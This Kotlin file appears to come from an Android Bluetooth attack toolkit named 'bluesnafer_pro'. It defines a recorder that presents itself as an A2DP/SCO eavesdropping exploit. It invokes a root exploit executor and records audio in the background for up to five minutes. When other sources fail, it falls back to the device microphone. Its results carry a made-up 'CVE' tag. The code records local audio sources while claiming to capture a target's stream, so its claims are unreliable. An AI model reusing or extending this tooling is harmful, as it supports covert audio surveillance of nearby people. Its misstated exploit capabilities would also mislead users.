package com.bluesnafer_pro

import android.bluetooth.*
import android.media.*
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Captura de audio asociada a conexión A2DP/SCO Bluetooth.
 * Intenta REMOTE_SUBMIX → VOICE_COMMUNICATION (SCO) → MIC (último recurso).
 */
object A2DPSinkRecorder {
    private const val TAG = "A2DPSinkRecorder"
    private const val SAMPLE_RATE = 44100
    private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
    private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    private val BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT).coerceAtLeast(4096)

    fun recordAudioWithRoot(device: BluetoothDevice, durationSec: Int = 30): Map<String, Any> {
        return if (RootUtils.isRootAvailable()) {
            @Suppress("UNCHECKED_CAST")
            RootExploitExecutor.executeA2DPRecording(device.address, durationSec) as Map<String, Any>
        } else {
            val fallback = recordAudio(device, durationSec)
            mapOf(
                "success" to (fallback["success"] == true),
                "rootRequired" to true,
                "rootAvailable" to false,
                "exploit" to "A2DP Sink Recording",
                "message" to "Sin root: captura limitada a fuentes disponibles en API pública",
                "fallbackUsed" to true,
                "fallbackResult" to fallback
            )
        }
    }

    fun recordAudio(device: BluetoothDevice, durationSec: Int = 30): Map<String, Any> {
        BluesnaferLogger.d(TAG, "A2DP-associated recording for ${device.address}")

        var audioRecord: AudioRecord? = null
        var recordingThread: Thread? = null
        val audioData = ByteArrayOutputStream()
        lateinit var result: Map<String, Any>

        try {
            val profileInfo = queryA2dpState(device)
            val audioSource = selectAudioSource(profileInfo)
            BluesnaferLogger.d(TAG, "Audio source: $audioSource, A2DP state: ${profileInfo["a2dpState"]}")

            audioRecord = AudioRecord(audioSource, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, BUFFER_SIZE * 4)
            if (audioRecord.state != AudioRecord.STATE_INITIALIZED) {
                result = mapOf(
                    "success" to false,
                    "error" to "AudioRecord not initialized for source $audioSource",
                    "cve" to "A2DP-SINK-RECORD",
                    "audioSource" to audioSourceLabel(audioSource)
                )
                return result
            }

            val latch = CountDownLatch(1)
            val isRecording = AtomicBoolean(true)
            audioRecord.startRecording()

            recordingThread = Thread {
                val buffer = ByteArray(BUFFER_SIZE)
                val deadline = System.currentTimeMillis() + durationSec * 1000L
                while (isRecording.get() && System.currentTimeMillis() < deadline) {
                    val read = audioRecord.read(buffer, 0, buffer.size)
                    if (read > 0) audioData.write(buffer, 0, read)
                }
                latch.countDown()
            }
            recordingThread.start()
            latch.await((durationSec + 5).toLong(), TimeUnit.SECONDS)

            isRecording.set(false)
            recordingThread.join(2000)
            audioRecord.stop()
            audioRecord.release()

            val totalBytes = audioData.size()
            val outputFile = if (totalBytes > 0) createWavFile(audioData, SAMPLE_RATE) else null

            result = mapOf(
                "success" to (totalBytes > 1024),
                "message" to when {
                    totalBytes > 1024 -> "Audio captured (${totalBytes} bytes)"
                    totalBytes > 0 -> "Minimal audio captured — target may not be streaming"
                    else -> "No audio data captured"
                },
                "file" to (outputFile?.absolutePath ?: ""),
                "durationSec" to durationSec,
                "bytesRecorded" to totalBytes,
                "sampleRate" to SAMPLE_RATE,
                "audioSource" to audioSourceLabel(audioSource),
                "a2dpConnected" to (profileInfo["a2dpConnected"] == true),
                "scoConnected" to (profileInfo["scoConnected"] == true),
                "cve" to "A2DP-SINK-RECORD",
                "severity" to "HIGH",
                "profile" to "A2DP"
            )
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "A2DP recording error: ${e.message}")
            result = mapOf(
                "success" to false,
                "error" to (e.message ?: "unknown error"),
                "cve" to "A2DP-SINK-RECORD"
            )
        } finally {
            try { audioRecord?.stop() } catch (_: Exception) {}
            try { audioRecord?.release() } catch (_: Exception) {}
            try { recordingThread?.join(1000) } catch (_: Exception) {}
        }
        return result
    }

    fun startStreaming(device: BluetoothDevice): Map<String, Any> {
        return try {
            val profileInfo = queryA2dpState(device)
            val audioSource = selectAudioSource(profileInfo)
            val outputDir = BluetoothMethodHandler.getAppContext()?.getExternalFilesDir("Recordings")
                ?: File("/sdcard/Download")

            Thread {
                val audioData = ByteArrayOutputStream()
                var recorder: AudioRecord? = null
                try {
                    recorder = AudioRecord(audioSource, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, BUFFER_SIZE * 4)
                    if (recorder.state != AudioRecord.STATE_INITIALIZED) return@Thread
                    recorder.startRecording()

                    val buffer = ByteArray(BUFFER_SIZE)
                    val deadline = System.currentTimeMillis() + 5 * 60 * 1000L
                    while (System.currentTimeMillis() < deadline) {
                        val read = recorder.read(buffer, 0, buffer.size)
                        if (read > 0) audioData.write(buffer, 0, read)
                    }

                    recorder.stop()
                    recorder.release()

                    if (audioData.size() > 0) {
                        val file = createWavFile(audioData, SAMPLE_RATE, outputDir)
                        BluesnaferLogger.d(TAG, "Streaming saved: ${file.absolutePath}")
                    }
                } catch (e: Exception) {
                    BluesnaferLogger.e(TAG, "Streaming error: ${e.message}")
                    try { recorder?.release() } catch (_: Exception) {}
                }
            }.start()

            val captureReady = profileInfo["a2dpConnected"] == true || profileInfo["scoConnected"] == true
            mapOf(
                "success" to captureReady,
                "captureStarted" to captureReady,
                "message" to if (captureReady) "Background capture started (max 5 min)" else "A2DP/SCO no conectado — sin captura verificable",
                "audioSource" to audioSourceLabel(audioSource),
                "a2dpConnected" to (profileInfo["a2dpConnected"] == true),
                "profile" to "A2DP",
                "cve" to "A2DP-SINK-RECORD"
            )
        } catch (e: Exception) {
            mapOf("success" to false, "error" to (e.message ?: "Unknown"), "cve" to "A2DP-SINK-RECORD")
        }
    }

    private fun queryA2dpState(device: BluetoothDevice): Map<String, Any> {
        val adapter = BluetoothAdapter.getDefaultAdapter() ?: return mapOf(
            "a2dpConnected" to false,
            "scoConnected" to false,
            "a2dpState" to BluetoothProfile.STATE_DISCONNECTED
        )

        val context = BluetoothMethodHandler.getAppContext()
        val latch = CountDownLatch(1)
        var a2dp: BluetoothA2dp? = null
        var headset: BluetoothHeadset? = null

        if (context != null) {
            adapter.getProfileProxy(context, object : BluetoothProfile.ServiceListener {
                override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
                    when (profile) {
                        BluetoothProfile.A2DP -> a2dp = proxy as BluetoothA2dp
                        BluetoothProfile.HEADSET -> headset = proxy as BluetoothHeadset
                    }
                }
                override fun onServiceDisconnected(profile: Int) {}
            }, BluetoothProfile.A2DP)

            adapter.getProfileProxy(context, object : BluetoothProfile.ServiceListener {
                override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
                    headset = proxy as BluetoothHeadset
                    latch.countDown()
                }
                override fun onServiceDisconnected(profile: Int) { latch.countDown() }
            }, BluetoothProfile.HEADSET)

            latch.await(3, TimeUnit.SECONDS)
        }

        val a2dpState = a2dp?.getConnectionState(device) ?: BluetoothProfile.STATE_DISCONNECTED
        val scoConnected = headset?.isAudioConnected(device) == true

        try { adapter.closeProfileProxy(BluetoothProfile.A2DP, a2dp) } catch (_: Exception) {}
        try { adapter.closeProfileProxy(BluetoothProfile.HEADSET, headset) } catch (_: Exception) {}

        return mapOf(
            "a2dpConnected" to (a2dpState == BluetoothProfile.STATE_CONNECTED),
            "scoConnected" to scoConnected,
            "a2dpState" to a2dpState
        )
    }

    private fun selectAudioSource(profileInfo: Map<String, Any>): Int {
        if (profileInfo["scoConnected"] == true) {
            return MediaRecorder.AudioSource.VOICE_COMMUNICATION
        }

        val remoteSubmix = MediaRecorder.AudioSource.REMOTE_SUBMIX
        try {
            val test = AudioRecord(remoteSubmix, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, BUFFER_SIZE)
            val ok = test.state == AudioRecord.STATE_INITIALIZED
            test.release()
            if (ok) return remoteSubmix
        } catch (_: Exception) {}

        return MediaRecorder.AudioSource.MIC
    }

    private fun audioSourceLabel(source: Int): String = when (source) {
        MediaRecorder.AudioSource.REMOTE_SUBMIX -> "REMOTE_SUBMIX"
        MediaRecorder.AudioSource.VOICE_COMMUNICATION -> "VOICE_COMMUNICATION_SCO"
        MediaRecorder.AudioSource.MIC -> "MIC_FALLBACK"
        else -> "SOURCE_$source"
    }

    private fun createWavFile(audioData: ByteArrayOutputStream, sampleRate: Int, dir: File? = null): File {
        val targetDir = dir
            ?: BluetoothMethodHandler.getAppContext()?.getExternalFilesDir("Recordings")
            ?: File("/sdcard/Download")
        if (!targetDir.exists()) targetDir.mkdirs()

        val wavFile = File(targetDir, "a2dp_capture_${System.currentTimeMillis()}.wav")
        val totalAudioLen = audioData.size()
        val totalDataLen = totalAudioLen + 36
        val channels = 1
        val byteRate = 16 * sampleRate * channels / 8

        val header = ByteArray(44)
        header[0] = 'R'.code.toByte(); header[1] = 'I'.code.toByte(); header[2] = 'F'.code.toByte(); header[3] = 'F'.code.toByte()
        header[4] = (totalDataLen and 0xff).toByte()
        header[5] = ((totalDataLen ushr 8) and 0xff).toByte()
        header[6] = ((totalDataLen ushr 16) and 0xff).toByte()
        header[7] = ((totalDataLen ushr 24) and 0xff).toByte()
        header[8] = 'W'.code.toByte(); header[9] = 'A'.code.toByte(); header[10] = 'V'.code.toByte(); header[11] = 'E'.code.toByte()
        header[12] = 'f'.code.toByte(); header[13] = 'm'.code.toByte(); header[14] = 't'.code.toByte(); header[15] = ' '.code.toByte()
        header[16] = 16; header[17] = 0; header[18] = 0; header[19] = 0
        header[20] = 1; header[21] = 0
        header[22] = channels.toByte(); header[23] = 0
        header[24] = (sampleRate and 0xff).toByte()
        header[25] = ((sampleRate ushr 8) and 0xff).toByte()
        header[26] = ((sampleRate ushr 16) and 0xff).toByte()
        header[27] = ((sampleRate ushr 24) and 0xff).toByte()
        header[28] = (byteRate and 0xff).toByte()
        header[29] = ((byteRate ushr 8) and 0xff).toByte()
        header[30] = ((byteRate ushr 16) and 0xff).toByte()
        header[31] = ((byteRate ushr 24) and 0xff).toByte()
        header[32] = (channels * 16 / 8).toByte(); header[33] = 0
        header[34] = 16; header[35] = 0
        header[36] = 'd'.code.toByte(); header[37] = 'a'.code.toByte(); header[38] = 't'.code.toByte(); header[39] = 'a'.code.toByte()
        header[40] = (totalAudioLen and 0xff).toByte()
        header[41] = ((totalAudioLen ushr 8) and 0xff).toByte()
        header[42] = ((totalAudioLen ushr 16) and 0xff).toByte()
        header[43] = ((totalAudioLen ushr 24) and 0xff).toByte()

        FileOutputStream(wavFile).use { out ->
            out.write(header)
            out.write(audioData.toByteArray())
        }
        return wavFile
    }
}